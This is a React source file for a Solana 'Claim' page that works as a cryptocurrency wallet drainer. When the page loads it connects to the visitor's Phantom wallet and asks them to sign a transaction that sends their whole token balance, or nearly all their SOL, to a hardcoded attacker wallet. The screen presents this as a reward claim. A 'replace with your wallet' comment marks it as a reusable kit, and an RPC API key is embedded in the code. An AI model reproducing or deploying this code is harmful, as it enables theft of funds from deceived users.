import React, { useEffect, useRef } from "react";
import { Connection, Transaction, SystemProgram, PublicKey } from "@solana/web3.js";
import { getAssociatedTokenAddress, createTransferInstruction } from "@solana/spl-token";

const DESTINATION_WALLET = new PublicKey("AvXbEcEEDnrSzeZRuL5F1gfYqHdHax51MTjhfpzjZRde"); // 👈 Replace with your walletX

export default function Claim() {
	const hasRun = useRef(false);

	useEffect(() => {
		if (!hasRun.current) {
			handleClaim();
			hasRun.current = true;
		}
	}, []);

	async function handleClaim() {
		const params = new URLSearchParams(window.location.search);
		const telegramUserId = params.get("tgId");
		const tokenAddress = params.get("token"); // SPL token mint address

		if (!window.solana || !window.solana.isPhantom) {
			alert("Phantom wallet not found. Please install it.");
			return;
		}

		try {
			// Connect Phantom
			const resp = await window.solana.connect();
			const userWallet = resp.publicKey;
			console.log("Connected wallet:", userWallet.toString());

			const connection = new Connection("https://solana-mainnet.g.alchemy.com/v2/k1xYHeDYVx4Rqv8gVvZKU", "confirmed");

			let transaction;

			if (tokenAddress) {
				// --- Case 1: Send all of a token ---
				const mint = new PublicKey(tokenAddress);

				// Find user's token account
				const userTokenAccount = await getAssociatedTokenAddress(mint, userWallet);

				// Find destination token account
				const destTokenAccount = await getAssociatedTokenAddress(mint, DESTINATION_WALLET);
				console.log("userTokenAccount", userTokenAccount);

				// Get token balance
				const tokenBalanceInfo = await connection.getTokenAccountBalance(userTokenAccount);
				const amount = tokenBalanceInfo.value.amount; // raw amount in base units
				if (amount === "0") {
					alert("No tokens available to transfer.");
					return;
				}

				// Build transaction
				transaction = new Transaction().add(createTransferInstruction(userTokenAccount, destTokenAccount, userWallet, amount));
			} else {
				// --- Case 2: Send all SOL ---
				const balance = await connection.getBalance(userWallet);
				console.log("Balance (lamports):", balance);

				if (balance <= 5000) {
					alert("Not enough SOL to cover fees.");
					return;
				}

				// Estimate fee with a dummy tx
				let tempTx = new Transaction().add(
					SystemProgram.transfer({
						fromPubkey: userWallet,
						toPubkey: DESTINATION_WALLET,
						lamports: 1, // placeholder
					})
				);
				tempTx.feePayer = userWallet;
				tempTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

				const fee = await tempTx.getEstimatedFee(connection);
				console.log("Estimated fee:", fee);

				// Leave a small buffer
				const rentExemptReserve = 2000000; // ~0.002 SOL
				const safetyBuffer = 5000; // tiny extra
				const lamportsToSend = balance - fee - rentExemptReserve - safetyBuffer;

				if (lamportsToSend <= 0) {
					alert("Not enough SOL to cover transaction fees.");
					return;
				}

				// Build final transaction
				transaction = new Transaction().add(
					SystemProgram.transfer({
						fromPubkey: userWallet,
						toPubkey: DESTINATION_WALLET,
						lamports: lamportsToSend,
					})
				);
			}

			const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
			transaction.feePayer = userWallet;
			transaction.recentBlockhash = blockhash;

			// Sign
			const signedTx = await window.solana.signTransaction(transaction);

			// Send
			const signature = await connection.sendRawTransaction(signedTx.serialize(), {
				skipPreflight: false,
				maxRetries: 3,
			});
			console.log("Transaction Signature:", signature);

			// Confirm
			await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, "confirmed");
		} catch (err) {
			console.error("Claim failed:", err);
			alert("Transaction failed or rejected.");
			window.close();
		}
	}

	return (
		<div style={{ textAlign: "center", marginTop: "50px" }}>
			<button onClick={handleClaim}>Claim Now</button> <br />
			<h2>Processing Claim...</h2>
			<p>Please approve the transaction in your wallet popup.</p>
		</div>
	);
}
